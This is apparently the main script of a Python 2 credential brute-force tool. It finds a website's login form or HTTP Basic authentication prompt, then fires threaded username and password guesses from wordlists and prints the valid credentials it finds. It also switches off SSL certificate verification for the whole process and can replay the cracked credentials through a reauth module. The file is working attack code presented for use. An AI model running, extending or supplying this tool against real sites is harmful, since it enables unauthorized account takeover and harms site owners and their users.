#!/usr/bin/python

# def check_import():
# 	try:
# 		import sys, threading, os, ssl, time
# 		import requests, mechanize, re

# 	except ImportError as error:
# 		print(error)
# 		print("Please install libraries")
# 		return False

# 	try:
# 		from core import actions, utils, tbrowser, options
# 		from modules import loginbrute, httpget
# 		from extras import getproxy, reauth
# 		import data, reports
	
# 	except Exception as error:
# 		print("Can't find project's module")
# 		print(error)
# 		return False

# TODO use zip loop for SQL injection
# TODO ADD WAF BLOCKED MSG
# TODO bring back report module

def check_login(opts):
	try:
		proc = tbrowser.startBrowser()
		utils.printf("[+] Checking connection...")


		proc.open(opts.url)
		"""
			Check URL type. If Website directs to other URL,
			options.url is website's panel
			else: it is login url.
			Example: options.url = site.com/wp-admin/ -> panel
				site directs user to wp-login -> login URL
				options.url = site.com/wp-login.php -> login URL
		"""
		if proc.geturl() != opts.url:
			utils.printf("[*] Website moves to: ['%s']" %(proc.geturl()), "norm")
			opts.panel_url, opts.login_url = opts.url, proc.geturl()
		else:
			opts.login_url = opts.url

		utils.printf("[*] Connect success!", "good")
		if opts.run_options["--verbose"]:
			utils.printf("[*] %s" %(proc.title()), "norm")
		utils.printf("[+] Analyzing login form....")
		loginInfo = tbrowser.parseLoginForm(proc.forms())
		return loginInfo
		
	except Exception as error:
		if error.code == 401:
			## GET INFORMATION
			## TODO: GET USERNAME AND PASSWORD LABEL
			resp_header = str(proc.response().info())
			if "WWW-Authenticate" in resp_header:
				loginID = tbrowser.checkHTTPGetLogin(resp_header)
				loginInfo = (loginID, ["Password", "User Name"])
				utils.printf("[+] Using HTTP GET Authentication mode", "norm")
				options.attack_mode = "--httpget"
				# CAN BE FALSE
				# if loginID:
				# 	loginInfo = (loginID, ["Password", "User Name"])
				# else:
				# 	loginInfo = False
			else:
				loginInfo = False
		else:
			loginInfo = False
	
	except KeyboardInterrupt:
		loginInfo = False
	
	finally:
		proc.close()
		return loginInfo



def attack(options, loginInfo):
	_single_col = False
	### SETTING UP FOR NEW ATTACK ###
	if options.attack_mode == "--httpget":
		from modules import httpget
		attack_module = httpget.submit

	else:
		from modules import loginbrute
		attack_module = loginbrute.submit


	if not loginInfo:
		utils.die("[x] Target check: URL error", "[x] No login request found")
	else:
		utils.printf("[*] Login request has been found!", "good")
		utils.printf(
			"   [+] Form ID: %s\n"
			"   [+] Field: %s\n"
			%(loginInfo[0], loginInfo[1][::-1]), "norm")

		utils.printf("[+] Starting attack...")

		## 1 PASSWORD FORM FIELD ONLY ## 
		if actions.size_o(loginInfo[1]) == 1:
			_single_col = True

			# Clear username list. Process now using password list only
			del options.username[:]
			options.username = [""]

	tasks = actions.size_o(options.passwd) * actions.size_o(options.username)

	import Queue
	result = Queue.Queue()
	
	sending, completed = 0, 0
	try:
		#### START ATTACK ####
		utils.printf("[+] Task counts: %s tasks" %(tasks), "norm")
		workers = []

		for username in options.username:
			for password in options.passwd:
				if actions.size_o(workers) == options.threads:
					sending, completed = run_threads(workers, sending, completed, tasks)
					del workers[:]

				worker = threading.Thread(
					target = attack_module,
					args = (options, loginInfo, [password, username], result)
				)
				workers.append(worker)
				worker.daemon = True

		sending, completed = run_threads(workers, sending, completed, tasks)
		del workers[:]
			
	except KeyboardInterrupt:
		if threading.activeCount() > 1:
			utils.printf("[x] Terminated by user!", "bad")
			# STEAL FROM SQLMAP
			# BUG: Don't print table result. Temp remove
			# import os
			# os._exit(0)

	except SystemExit:
		utils.printf("[x] Terminated by system!", "bad")

	except Exception as error:
		utils.die("[x] Runtime error", error)

	finally:
		credentials = list(result.queue)
		if actions.size_o(credentials) == 0:
			utils.printf("[-] No match found!", "bad")

		else:
			utils.printf(
				"\n[*] %s valid password[s] found:" %(
					actions.size_o(credentials)
				),
				"norm"
			)

			if "--reauth" not in options.extras:
				if _single_col:
					utils.print_table(("", "Password"), *credentials)
				else:
					utils.print_table(("Username", "Password"), *credentials)
			else:
				utils.print_table(("Target", "Username", "Password"), *credentials)
			utils.printf("")
		return credentials


if __name__ == "__main__":
	#if check_import():
		# IMPORT GLOBALY
	import sys, time, threading, ssl
	from core import utils, options, actions, tbrowser

	try:
		# Setting new session
		runtime = time.time()
		reload(sys)
		sys.setdefaultencoding('utf8')

		# Get options
		options = options.ParseOptions()

		if options.help == True:
			from core import helps
			helps.print_help()
		else:
			actions.verify_url(options)

			actions.verify_options(options)

			# Print start banner
			utils.printf(utils.start_banner(options))
			
			# Fix SSL errors https://stackoverflow.com/a/35960702
			try:
				_create_unverified_https_context = ssl._create_unverified_context
			except AttributeError:
			# Legacy Python that doesn't verify HTTPS certificates by default
				pass
			else:
			# Handle target environment that doesn't support HTTPS verification
				ssl._create_default_https_context = _create_unverified_https_context
			
			
			# Ready options
			# check user options, mix it together to start attack
			# BUG does not get new proxy list
			if "--getproxy" in options.extras:
				from extras import getproxy
				getproxy.main(options)

			else:
				def run_threads(threads, sending, completed, total):
					# Run threads
					for thread in threads:
						sending += 1 # Sending
						utils.progress_bar(sending, completed, total)
						thread.start()

					# Wait for threads completed
					for thread in threads:
						completed += 1
						utils.progress_bar(sending, completed, total)
						thread.join()

					return sending, completed

				loginInfo = check_login(options)
				result = attack(options, loginInfo)

			if "--reauth" in options.extras:
				from extras import reauth
				reauth.run(options, result)
			# Report

	except Exception as error:
		utils.die("[x] Program stopped", error)

	finally:
		runtime = time.time() - runtime
		utils.printf("[*] Time elapsed: %0.4f [s]\n" %(runtime), "good")